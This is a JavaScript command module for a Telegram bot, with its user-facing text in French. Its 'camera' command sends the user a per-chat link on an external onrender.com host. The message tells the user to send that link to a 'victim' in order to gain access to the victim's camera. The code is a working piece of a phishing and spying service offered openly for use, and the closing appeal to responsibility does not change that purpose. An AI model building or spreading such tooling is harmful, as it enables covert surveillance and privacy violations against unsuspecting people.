module.exports = {
  name: 'camera',
  description: 'Envoie un lien hack caméra ',
  async execute(bot, msg) {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name || 'utilisateur';
    const baseUrl = 'https://new-number-virtuel.onrender.com';
    const url = `${baseUrl}/${chatId}`;

    const text = `📸 *Salutations @${username}*\n\n` +
      `🔗 copie ce lien, envoi le à ta victime pour avoir accès à sa caméra :\n\n` +
      `\`\`\`\n${url}\n\`\`\`\n\n` +
      `Merci de l'utiliser avec responsabilité.`;

    await bot.sendMessage(chatId, text, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Ouvrir le lien', url }]
        ]
      }
    });
  }
};